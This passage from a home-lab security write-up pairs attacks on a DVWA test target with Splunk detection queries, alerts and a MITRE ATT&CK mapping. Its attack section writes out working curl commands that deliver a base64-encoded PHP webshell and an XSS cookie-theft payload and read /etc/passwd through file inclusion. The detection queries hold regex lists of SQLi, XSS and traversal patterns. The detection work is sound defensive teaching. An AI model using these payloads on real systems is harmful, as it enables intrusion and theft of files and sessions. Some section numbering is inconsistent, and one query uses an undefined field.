**MITRE:** T1027 — Obfuscated Files or Information
**Target:** `http://192.168.1.4/dvwa/vulnerabilities/xss_r/` and file inclusion endpoint

#### Attack Execution

```bash
# ---- Step 1: Encode a malicious payload ----
# PHP webshell
echo -n '<?php system($_GET["cmd"]); ?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# XSS payload
echo -n '<script>alert(document.cookie)</script>' | base64
# Output: PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+

# ---- Step 2: Deliver encoded payload in parameter ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/xss_r/?name=PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+&Submit=Submit" -vv

# ---- Step 3: PHP base64_decode wrapper (file inclusion) ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/etc/passwd" -vv
# Returns /etc/passwd content as base64 — decode with:
# echo "BASE64_OUTPUT" | base64 -d

# ---- Step 4: Data URI base64 scheme ----
curl -b PHPSESSID="73c02d0243eef087f397950543f56e9e; security="low" " "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+"

# ---- Step 5: Decode intercepted payload (CyberChef or CLI) ----
echo "PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+" | base64 -d
# Output: <?php system($_GET["cmd"]); ?>

echo "PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+" | base64 -d
# Output: <script>alert(document.cookie)</script>
```

#### Apache Log Evidence on Splunk

```
Jul  3 03:47:06 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:03:47:01 -0400] "GET /dvwa/vulnerabilities/fi/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ HTTP/1.1" 200 5025 "-" "curl/8.20.0"
Jul  3 03:47:50 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:03:47:44 -0400] "GET /dvwa/vulnerabilities/fi/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+ HTTP/1.1" 200 5025 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
Jul  3 03:48:04 192.168.1.4 apache_access: 192.168.1.3 - - [03/Jul/2026:03:47:58 -0400] "GET /dvwa/security.php HTTP/1.1" 200 4104 "http://192.168.1.4/dvwa/vulnerabilities/fi/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+" "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"
```

---


---

## 6. Splunk Detection Query Library

> All queries run in Splunk on Kali Linux at `http://192.168.1.3:8000`
> Navigate to: **Search & Reporting → New Search**
> Set time range to match the attack window before running.

---

### 7.1 Web Detection Queries

---

**Query D-01 — SQL Injection Detection**

Detects SQLi payloads in URI parameters including URL-encoded and boolean-based variants.

```spl
index=web_logs sourcetype="sys_log" 
| rex field=_raw "apache_access:\s+(?P<src_ip>[^\s-]+)"
| rex field=_raw "\"(?:GET|POST)\s(?P<full_uri>\S+)\sHTTP"
| rex field=_raw "\" HTTP\/\d\.\d\"\s+(?P<status>\d{3})"
| eval decoded_uri = urldecode(full_uri)
| rex field=decoded_uri "(?i)(?P<sqli_hit>(union[\s\+]+select|select[\s\+]+.*from|insert[\s\+]+into|drop[\s\+]+table|exec[\s\+]*\(|xp_cmdshell|1\s*=\s*1|or\s+1\s*=\s*1|--\s|\/\*.*\*\/|sleep\s*\(|waitfor\s+delay|benchmark\s*\(|order\s+by\s+\d|and\s+\d+=\d+))"
| where isnotnull(sqli_hit)
| eval encoding = if(match(full_uri,"(?i)(%27|%22|%3d|%20|%2b|%2520)"),"URL-Encoded","Plaintext")
| stats
    count as total_attempts,
    values(sqli_hit) as validation_patterns,
    values(encoding) as encoding_types,
    values(status) as http_status_codes,
    min(_time) as first_seen,
    max(_time) as last_seen
    by src_ip
| eval duration_sec = last_seen - first_seen
| eval req_per_sec = round(total_attempts / max((duration_sec + 1), 1), 2)
| eval risk = case(
    total_attempts > 100, "HIGH",
    total_attempts > 20,  "MEDIUM",
    true(),               "LOW"
  )
| sort -total_attempts
| table src_ip, total_attempts, validation_patterns, encoding_types, http_status_codes, req_per_sec, risk
```

**What to look for in results:**
- `patterns_found` shows which SQL keywords appeared
- `encoding_types` shows if attacker tried URL-encoding (evasion)
- `req_per_sec` above 5 confirms automated tool
- `http_status_codes` mixing 200 and 500 confirms probing behavior

---

**Query D-02 — XSS Detection (Multi-Encoding)**

Detects cross-site scripting payloads including raw, single-encoded, and double-encoded variants.

```spl
index=web_logs sourcetype="sys_log" 
| rex field=_raw "apache_access:\s+(?P<src_ip>[^\s-]+)"
| rex field=_raw "\"(?:GET|POST)\s(?P<full_uri>\S+)\sHTTP"
| rex field=_raw "\" HTTP\/\d\.\d\"\s+(?P<status>\d{3})"
| eval decoded_uri = urldecode(full_uri)
| rex field=decoded_uri "(?i)(?P<xss_hit>(<script>|alert\(|onerror=|onload=|javascript:|document\.cookie))"
| where isnotnull(xss_hit)
| eval encoding = if(match(full_uri,"(?i)(%3C|%3E|%28|%29)"),"URL-Encoded","Plaintext")
| stats 
    count as total_attempts, 
    values(full_uri) as attacked_uris, 
    values(xss_hit) as patterns_found, 
    values(encoding) as encoding_types, 
    values(status) as http_status_codes, 
    min(_time) as first_seen, 
    max(_time) as last_seen 
    by src_ip
| eval duration_sec = last_seen - first_seen
| eval req_per_sec = round(total_attempts / max((duration_sec + 1), 1), 2)
| eval risk = case(
    total_attempts > 100, "HIGH",
    total_attempts > 20,  "MEDIUM",
    true(),               "LOW"
  )
| sort -total_attempts
| table src_ip, total_attempts, attacked_uris, patterns_found, encoding_types, http_status_codes, risk
```

---

**Query D-03 — LFI and Path Traversal**

Detects all path traversal variants including PHP stream wrappers and encoding variants.

```spl
index=web_logs sourcetype="sys_log" 
| rex field=_raw "apache_access:\s+(?P<src_ip>[^\s-]+)"
| rex field=_raw "\"(?:GET|POST)\s(?P<full_uri>\S+)\sHTTP"
| rex field=_raw "\" HTTP\/\d\.\d\"\s+(?P<status>\d{3})"
| eval decoded_uri = urldecode(full_uri)
| rex field=decoded_uri "(?i)(?P<lfi_hit>(\.\.\/|\.\.\\|/etc/passwd|/var/log/|etc/shadow|boot\.ini))"
| where isnotnull(lfi_hit)
| eval encoding = if(match(full_uri,"(?i)(%2e%2e%2f|%2e%2e%5c|%2f|%5c)"),"URL-Encoded","Plaintext")
| stats 
    count as total_attempts, 
    values(full_uri) as attacked_uris, 
    values(lfi_hit) as patterns_found, 
    values(encoding) as encoding_types, 
    values(status) as http_status_codes, 
    min(_time) as first_seen, 
    max(_time) as last_seen 
    by src_ip
| eval duration_sec = last_seen - first_seen
| eval req_per_sec = round(total_attempts / max((duration_sec + 1), 1), 2)
| eval risk = case(
    total_attempts > 100, "HIGH",
    total_attempts > 20,  "MEDIUM",
    true(),               "LOW"
  )
| sort -total_attempts
| table src_ip, total_attempts, attacked_uris, patterns_found, encoding_types, http_status_codes, risk
```

---

**Query D-04 — Brute Force Login Detection**

Detects high-volume login attempts against the same endpoint from a single IP.

```spl
index=web_logs sourcetype="sys_log" 
| rex field=_raw "apache_access:\s+(?P<src_ip>[^\s-]+)"
| rex field=_raw "\"(?:GET|POST)\s(?P<full_uri>\S+)\sHTTP"
| rex field=_raw "\" HTTP\/\d\.\d\"\s+(?P<status>\d{3})\s+(?P<bytes>\d+|-)"
| rex field=_raw "\"\s+\"(?P<user_agent>[^\"]+)\"$"
| where match(full_uri, "(?i)(/brute|/login|/signin|/auth)")
| eval attempt_result = case(
    status="302", "success",
    bytes > 5050 AND status="200", "success",
    true(), "failure"
  )
| bucket _time span=1m
| stats
    count(eval(attempt_result="failure")) as failures,
    count(eval(attempt_result="success")) as successes,
    values(user_agent) as user_agents,
    dc(full_uri) as endpoints_targeted
    by src_ip, _time
| where failures > 15
| eval finding = case(
    successes > 0 AND failures > 15, "CRITICAL: Brute Force Succeeded — Login confirmed after " + tostring(failures) + " failures",
    failures > 100, "HIGH: High-volume brute force (" + tostring(failures) + " attempts/min)",
    failures > 15, "MEDIUM: Brute force detected (" + tostring(failures) + " attempts/min)"
  )
| eval hydra_detected = if(match(mvjoin(user_agents,"|"),"(?i)(hydra|medusa)"), "YES - Tool signature in UA", "Check UA manually")
| sort -failures
| table _time, src_ip, failures, successes, finding, hydra_detected
```

---

**Query D-05 — Brute Force Success Correlation**

Correlates a high failure count with a subsequent successful login from the same IP. Confirms a brute force compromise.

```spl
index=web_logs sourcetype="sys_log" 
| rex field=_raw "apache_access:\s+(?P<src_ip>[^\s-]+)"
| rex field=_raw "\"(?:GET|POST)\s(?P<full_uri>\S+)\sHTTP"
| rex field=_raw "\" HTTP\/\d\.\d\"\s+(?P<status>\d{3})\s+(?P<bytes>\d+|-)"
| where match(full_uri, "(?i)(/brute|/login)")
| eval event_type = case(
    status="302", "SUCCESS",
    bytes > 5050 AND status="200", "SUCCESS",
    true(), "FAILURE"
  )
| stats
    count(eval(event_type="FAILURE")) as total_failures,
    count(eval(event_type="SUCCESS")) as total_successes,
    min(eval(if(event_type="SUCCESS",_time,null()))) as first_success_time,
    min(_time) as attack_start
    by src_ip
| where total_failures > 20 AND total_successes > 0
| eval compromise_confirmed = "YES"
| eval time_to_success_sec = first_success_time - attack_start
| table src_ip, total_failures, total_successes, time_to_success_sec, compromise_confirmed
```

---

**Query D-06 — Directory Enumeration Detection**

Detects wordlist scanning based on high 404 volume from a single source in a short window.

```spl
index=web_logs sourcetype=sys_log "apache_access"
| rex field=_raw "apache_access:\s+(?<src_ip>\d+\.\d+\.\d+\.\d+)"
| rex field=_raw "\"(?<method>GET|POST)\s+(?<uri>\S+)\s+HTTP"
| rex field=_raw "HTTP\/\d\.\d\"\s+(?<status>\d{3})"
| bucket _time span=1m
| stats count as total_requests
        count(eval(status="404")) as errors404
        dc(uri) as unique_paths
        values(uri) as sample_paths
        by src_ip _time
| where errors404>20 AND unique_paths>20
| eval attack="Directory Enumeration"
| table _time src_ip total_requests errors404 unique_paths attack sample_paths
```

---

**Query D-07 — HTTP Error Spike (Injection and Scanning Signal)**

Detects abnormal spikes in server errors (5xx) or client errors (4xx) that indicate active scanning or injection probing.

```index=* sourcetype="sys_log"
| rex field=_raw "apache_access:\s+(?P<src_ip>[^\s-]+)"
| rex field=_raw "\" HTTP\/\d\.\d\"\s+(?P<status>\d{3})"
| eval error_class = case(
    status >= 500, "5xx_server_error",
    true(), "other"
  )
| bucket _time span=5m
| stats
    count(eval(error_class="5xx_server_error")) as server_errors,
    count as total_requests
    by _time, src_ip
| where server_errors > 10 OR client_errors > 100
| eval alert = case(
    server_errors > 50, "CRITICAL: Server error flood — possible active injection",
    server_errors > 10, "HIGH: Elevated 5xx errors — application probing",
    client_errors > 500, "HIGH: Mass 4xx errors — wordlist scanning",
    true(), "MEDIUM: Error spike — review manually"
  )
| eval error_rate = tostring(round((server_errors + client_errors) / total_requests * 100, 1)) + "%"
| sort -server_errors
| table _time, src_ip, server_errors, client_errors, total_requests, error_rate, alert
```

---

**Query D-08 — Base64 Encoded Payload in URI**

Detects anomalously long Base64 strings in URI parameters and attempts to decode them for triage.

```spl
index=* sourcetype="sys_log"
| rex field=_raw "apache_access:\s+(?P<src_ip>[^\s-]+)"
| rex field=_raw "\"(?:GET|POST)\s(?P<full_uri>\S+)\sHTTP"
| rex field=_raw "\" HTTP\/\d\.\d\"\s+(?P<status>\d{3})"
| rex field=full_uri "(?P<b64_candidate>[A-Za-z0-9+/]{30,}={0,2})"
| where isnotnull(b64_candidate)
| eval b64_length = len(b64_candidate)
| where b64_length > 30
| eval payload_risk = "MEDIUM: Encoded string detected — manual decoding required"
| table _time, src_ip, full_uri, b64_candidate, payload_risk, status
| sort -_time
```

---


---

## 7. Alerting & Dashboard

### 8.1 Splunk Alert Configuration

Six scheduled alerts are configured in Splunk. To create each:
**Settings → Searches, Reports, and Alerts → New Alert**

---

**Alert ALT-01 — SQL Injection Detected**

```
Name          : ALT-01 SQL Injection Detected
Alert Type    : Scheduled
Search        : [Query D-01 above]
Time Range    : Last 10 minutes
Schedule      : Run every 5 minutes
Trigger When  : Number of results is greater than 0
Throttle      : Suppress for 10 minutes after firing
Severity      : High

Actions:
  [x] Add to Triggered Alerts
  [x] Log Event
  Email Subject : [HIGH] SQL Injection Detected — $result.src_ip$
  Email Body    : $result.total_attempts$ SQLi attempts from $result.src_ip$
                  Patterns: $result.patterns_found$
                  Risk: $result.risk$
```

---

**Alert ALT-02 — Brute Force Web Login**

```
Name          : ALT-02 Brute Force Web Login
Search        : [Query D-04 above]
Time Range    : Last 5 minutes
Schedule      : Every 2 minutes
Trigger When  : Number of results > 0
Throttle      : 15 minutes
Severity      : High

Email Subject : [HIGH] Web Brute Force — $result.failures$ attempts from $result.src_ip$
Email Body    : $result.finding$
                Hydra/Tool detected: $result.hydra_detected$
```

---

**Alert ALT-03 — Brute Force Compromise Confirmed**

```
Name          : ALT-03 BRUTE FORCE COMPROMISE CONFIRMED
Search        : [Query D-05 above]
Time Range    : Last 30 minutes
Schedule      : Every 5 minutes
Trigger When  : Number of results > 0
Throttle      : 60 minutes
Severity      : Critical

Email Subject : [CRITICAL] Brute Force Succeeded — $result.src_ip$
Email Body    : Source: $result.src_ip$
                Failures before success: $result.total_failures$
                Time to compromise: $result.time_to_compromise_sec$ seconds
                IMMEDIATE TRIAGE REQUIRED
```

---

**Alert ALT-04 — Directory Enumeration**

```
Name          : ALT-04 Directory Enumeration Detected
Search        : [Query D-06 above]
Time Range    : Last 10 minutes
Schedule      : Every 5 minutes
Trigger When  : Number of results > 0
Throttle      : 30 minutes
Severity      : Medium

Email Subject : [MEDIUM] Directory Scan — $result.not_found_count$ 404s from $result.src_ip$
```

---

---

### 8.2 Dashboard Layout

-----------------------------------REMAINING----------------------------------
```

---


---

## 8. MITRE ATT&CK Mapping

### 9.1 Full Technique Coverage

| # | Attack Simulated | Tactic | ID | Technique | Sub-technique |
|---|---|---|---|---|---|
| 1 | SQL Injection | Initial Access | T1190 | Exploit Public-Facing Application | — |
| 2 | XSS — Reflected | Collection | T1059 | Command & Scripting Interpreter | T1059.007 JavaScript |
| 3 | XSS — Cookie Theft | Collection | T1539 | Steal Web Session Cookie | — |
| 4 | LFI / Path Traversal | Discovery | T1083 | File and Directory Discovery | — |
| 5 | Brute Force — Web | Credential Access | T1110 | Brute Force | T1110.001 Password Guessing |
| 6 | Directory Enumeration | Reconnaissance | T1595 | Active Scanning | T1595.003 Wordlist Scanning |
| 7 | Base64 Encoded Payloads | Defense Evasion | T1027 | Obfuscated Files or Information | — |

### 9.2 Tactic Coverage Map

```
MITRE ATT&CK TACTICS COVERED IN THIS LAB
==========================================

RECONNAISSANCE
  [x] T1595.003 — Wordlist Scanning (directory enumeration with Gobuster)

INITIAL ACCESS
  [x] T1190     — Exploit Public-Facing Application (SQL injection)

EXECUTION
  [x] T1059.007 — JavaScript (XSS payload injection)

PERSISTENCE
  [ ] Not simulated this iteration (future: T1053.005 Scheduled Task)

DEFENSE EVASION
  [x] T1027     — Obfuscated Files or Information (Base64 payload encoding)
  [x] T1218     — System Binary Proxy Execution (certutil, mshta, regsvr32)

CREDENTIAL ACCESS
  [x] T1110.001 — Password Guessing (Hydra web brute force, CrackMapExec SMB)
  [x] T1539     — Steal Web Session Cookie (XSS cookie theft)

DISCOVERY
  [x] T1083     — File and Directory Discovery (LFI / path traversal)


COLLECTION
  [x] T1185     — Browser Session Hijacking (XSS)

```

> **Next step:** Open [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) → select all techniques above → color them → export as `navigator-layer.json` → include in `06-mitre-mapping/` folder.

---


---

## 10. References

### Lab Tools & Documentation

- [Kali Linux Docs](https://www.kali.org/docs/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [sqlmap Documentation](https://sqlmap.org/)
- [Hydra — thc.org](https://github.com/vanhauser-thc/thc-hydra)
- [Gobuster](https://github.com/OJ/gobuster)
- [DVWA — Damn Vulnerable Web App](https://github.com/digininja/DVWA)
- [Metasploitable 2](https://sourceforge.net/projects/metasploitable/)
- [CyberChef — Base64 decode](https://gchq.github.io/CyberChef/)

### SIEM — Splunk

- [Splunk Enterprise Download (free trial)](https://www.splunk.com/en_us/download/splunk-enterprise.html)
- [Splunk SPL Reference Manual](https://docs.splunk.com/Documentation/Splunk/latest/SearchReference)
- [Splunk Search Tutorial](https://docs.splunk.com/Documentation/Splunk/latest/SearchTutorial)
- [Splunk Universal Forwarder](https://docs.splunk.com/Documentation/Forwarder)
- [Splunk Security Essentials App (free)](https://splunkbase.splunk.com/app/3435)

### Frameworks & Standards

- [MITRE ATT&CK v14](https://attack.mitre.org/)
- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [NIST SP 800-61r2 — Incident Response Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf)
- [CIS Controls v8](https://www.cisecurity.org/controls/)


### Community Detection Resources

- [Sigma Rules Repository — SigmaHQ](https://github.com/SigmaHQ/sigma)
- [LOLBins Reference — LOLBAS Project](https://lolbas-project.github.io/)
- [Florian Roth Detection Resources](https://github.com/Neo23x0)

---
